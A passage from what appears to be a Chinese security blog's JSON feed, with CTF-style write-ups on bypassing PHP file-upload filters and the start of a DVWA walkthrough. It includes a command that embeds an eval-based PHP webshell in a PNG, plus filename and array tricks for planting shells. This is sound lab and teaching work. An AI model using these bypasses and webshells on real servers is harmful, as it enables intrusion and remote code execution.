operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>status_code<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>同时访问 xiao.php，访问到就是小马已成功上传</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707211755178.png\" alt=\"image-20240707211755178\" /></p>\n<p>连接小马，获取 flag</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707211843672.png\" alt=\"image-20240707211843672\" /></p>\n<h2 id=\"二次渲染绕过\"><a class=\"anchor\" href=\"#二次渲染绕过\">#</a> 二次渲染绕过</h2>\n<p><img loading=\"lazy\" data-src=\"image-20240707213657494.png\" alt=\"image-20240707213657494\" /></p>\n<p>png 绕过二次渲染脚本：<a href=\"https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py\">https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py</a> (python2)</p>\n<p>图片用：<a href=\"https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/test.png\">https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/test.png</a></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python poc_png.py test.png <span class=\"token parameter variable\">-p</span> <span class=\"token string\">\"&lt;?php error_reporting(0); highlight_file(__FILE__); eval(<span class=\"token variable\">$_REQUEST</span>[1]);?>\"</span> <span class=\"token parameter variable\">-o</span> shell.png</pre></td></tr></table></figure><p>上传 shell.png，复制图片地址 <code>http://192.168.23.129:30011/?file=./upload/808109912.png</code> ，点击查看提示，会发现一个链接出现文件包含</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707220304350.png\" alt=\"image-20240707220304350\" /></p>\n<p>直接包含刚才的图马： <code>http://192.168.23.129:30011/?file=./upload/808109912.png</code>  并与木马连接执行命令</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707221354605.png\" alt=\"image-20240707221354605\" /></p>\n<p>查看 flag 文件 flagggg</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707221516606.png\" alt=\"image-20240707221516606\" /></p>\n<h2 id=\"代码审计1\"><a class=\"anchor\" href=\"#代码审计1\">#</a> 代码审计 1</h2>\n<p><img loading=\"lazy\" data-src=\"image-20240707225548013.png\" alt=\"image-20240707225548013\" /></p>\n<p><code>move_uploaded_file($temp_file, $img_path)</code>  将上传的 temp_file 移动到 img_path 目录</p>\n<p>选择上传文件 <code>shell.php</code> ，输入保存的文件名为 <code>shell.php/.</code>  点击上传即可绕过</p>\n<p>当 PHP 解析文件路径时，会将 &quot;/.&quot; 解析为当前目录，因此上传的文件名最终会被解析为 &quot;shell.php&quot;，而不是 &quot;shell.php/.&quot;，如果存在 shell.php 文件则上传失败，shell.php 会被当作目录。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707225928582.png\" alt=\"image-20240707225928582\" /></p>\n<p>连接木马执行命令，得到 flag</p>\n<p><img loading=\"lazy\" data-src=\"image-20240707230417908.png\" alt=\"image-20240707230417908\" /></p>\n<h2 id=\"代码审计2\"><a class=\"anchor\" href=\"#代码审计2\">#</a> 代码审计 2</h2>\n<p><img loading=\"lazy\" data-src=\"image-20240708222641175.png\" alt=\"image-20240708222641175\" /></p>\n<p>关键代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token variable\">$allow_type</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'image/jpeg'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'image/png'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'image/gif'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$allow_type</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>black();&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'save_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'save_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                <span class=\"token variable\">$ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token variable\">$allow_suffix</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'jpg'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'png'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'gif'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ext</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$allow_suffix</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>black();&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                    <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">reset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                    <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                    <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">.</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                        <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>error();&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>第一部分关键代码：这里对 MIME 进行判断， <code>$_FILES['upload_file'][type]</code>  上传文件的 MIME 类型</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$allow_type</span> <span class=\"token operator\">=</span> array<span class=\"token punctuation\">(</span><span class=\"token string\">'image/jpeg'</span>,<span class=\"token string\">'image/png'</span>,<span class=\"token string\">'image/gif'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>if<span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>in_array<span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span>,<span class=\"token variable\">$allow_type</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"&lt;script>black();&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>第二部分关键代码：如果 <code>$file</code>  不是数组将用 <code>.</code>  将文件名拆分成数组 <code>[0=&gt;&quot;shell&quot;, 1=&gt;&quot;php&quot;]</code> ，也是就是说如果是数组就不会拆分</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> empty<span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string\">'save_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> ? <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span> <span class=\"token builtin class-name\">:</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string\">'save_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>is_array<span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">))</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    \t<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> explode<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span>, strtolower<span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">))</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>第三部分关键代码：判断拆分后的数组末尾的元素是否是合法的文件扩展名</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token variable\">$allow_suffix</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'jpg'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'png'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'gif'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ext</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$allow_suffix</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    \t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>black();&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>第四部分关键代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 最终文件名</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t\t<span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">reset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token comment\">// 上传的文件存储在服务器上的临时文件名</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token comment\">// 配置图片路径，包括图片最终保存的文件名</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">.</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token comment\">// 将临时文件移动到图片路径并进行重命名</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        \t<span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>error();&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>构造数组传入 <code>[0=&gt;&quot;shell.php/&quot;, 2=&gt;&quot;php&quot;]</code></p>\n<p>最终文件名： <code>shell.php/.</code>  配合 <code>move_uploaded_file()</code>  的缺陷</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">reset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> shell<span class=\"token operator\">.</span>php<span class=\"token operator\">/</span>   <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">//$file [1] 为空</span></pre></td></tr></table></figure><p>构造请求包：这里上传的木马先改成 shell.png 再上传，然后用 bp 改包，直接上传 shell.php 然后在包里改 MIME 不生效</p>\n<p><img loading=\"lazy\" data-src=\"image-20240708231607798.png\" alt=\"image-20240708231607798\" /></p>\n<p>上传成功，获得 flag</p>\n<p><img loading=\"lazy\" data-src=\"image-20240708231753273.png\" alt=\"image-20240708231753273\" /></p>\n",
            "tags": [
                "Web安全",
                "Web安全",
                "文件上传"
            ]
        },
        {
            "id": "https://ph0ven1x.github.io/2024/05/16/DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3/",
            "url": "https://ph0ven1x.github.io/2024/05/16/DVWA%E5%85%A8%E7%BA%A7%E5%88%AB%E9%80%9A%E5%85%B3/",
            "title": "DVWA全级别通关",
            "date_published": "2024-05-16T07:06:49.000Z",
            "content_html": "<h1 id=\"dvwa全级别通关\"><a class=\"anchor\" href=\"#dvwa全级别通关\">#</a> DVWA 全级别通关</h1>\n<h2 id=\"安装部署\"><a class=\"anchor\" href=\"#安装部署\">#</a> 安装部署</h2>\n<p>直接用 dockers 拉个镜像即可</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">docker</span> pull vulnerables/web-dvwa:latest</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-it</span> <span class=\"token parameter variable\">-d</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">8001</span>:80 <span class=\"token parameter variable\">-p</span> <span class=\"token number\">3336</span>:3306 vulnerables/web-dvwa</pre></td></tr></table></figure><p>装完以后发现，有点问题</p>\n<ol>\n<li><code>allow_url_include = Off</code></li>\n</ol>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 进入 dvwa 容器</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">docker</span> <span class=\"token builtin class-name\">exec</span> <span class=\"token parameter variable\">-it</span> <span class=\"token operator\">&lt;</span>container id<span class=\"token operator\">></span> <span class=\"token function\">bash</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token string\">'allow_url_include = Off'</span> / </pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 进入这个目录 /etc/php/7.0/apache2/php.ini:allow_url_include = Off 改这个即可</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 没用 vim/vi 用 sed</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">sed</span> <span class=\"token parameter variable\">-i</span> <span class=\"token string\">'s/allow_url_include = Off/allow_url_include = On/g'</span> php.ini</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">service</span> apache2 restart</pre></td></tr></table></figure><ol start=\"2\">\n<li><code>reCAPTCHA key:Missing</code></li>\n</ol>\n<p>公钥和私钥自己去申请一下 选择 v2 复选框的版本：<br />\n<a href=\"https://www.google.com/recaptcha/admin/create\">https://www.google.com/recaptcha/admin/create</a></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 进入 dvwa 容器</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 进入目录 /var/www/html/config/config.inc.php 改这个即可</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 可以看一下公钥私钥字段的行数，我这里是 29 和 30 行</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 在 29 行前插入公钥</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">nl</span> config.inc.php <span class=\"token operator\">|</span> <span class=\"token function\">sed</span> <span class=\"token parameter variable\">-i</span> <span class=\"token string\">\"30i \\<span class=\"token variable\">$_DVWA</span>[ 'recaptcha_public_key' ]  = 'xxxxxxxxxxx...';\"</span> config.inc.php</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 在 30 行前插入私钥</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">nl</span> config.inc.php <span class=\"token operator\">|</span> <span class=\"token function\">sed</span> <span class=\"token parameter variable\">-i</span> <span class=\"token string\">\"30i \\<span class=\"token variable\">$_DVWA</span>[ 'recaptcha_private_key' ]  = 'xxxxxxxxxxx...';\"</span> config.inc.php</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 把以前的 31 行和 32 行删掉</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">nl</span> config.inc.php <span class=\"token operator\">|</span> <span class=\"token function\">sed</span> <span class=\"token parameter variable\">-i</span> <span class=\"token string\">\"31,32d\"</span> config.inc.php</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 重启下 apache</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">service</span> apache2 restart</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 不放心的话也可以退出 dvwa docker 的系统，重启一下 dvwa 容器</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token builtin class-name\">exit</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">docker</span> restart <span class=\"token operator\">&lt;</span>container id<span class=\"token operator\">></span></pre></td></tr></table></figure><p>如下图这样就是配置成功了</p>\n<p><img loading=\"lazy\" data-src=\"image-sasa-1721199923435-1.png\" alt=\"\" /></p>\n<h2 id=\"brute-force-暴力破解\"><a class=\"anchor\" href=\"#brute-force-暴力破解\">#</a> Brute Force 暴力破解</h2>\n<h3 id=\"low级\"><a class=\"anchor\" href=\"#low级\">#</a> low 级</h3>\n<p><img loading=\"lazy\" data-src=\"image-20240515144908154-1721199923435-2.png\" alt=\"\" /></p>\n<p>先对代码进行审计，没有任何防爆机制</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Login'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// Get username</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// Get password</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// Check the database</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string 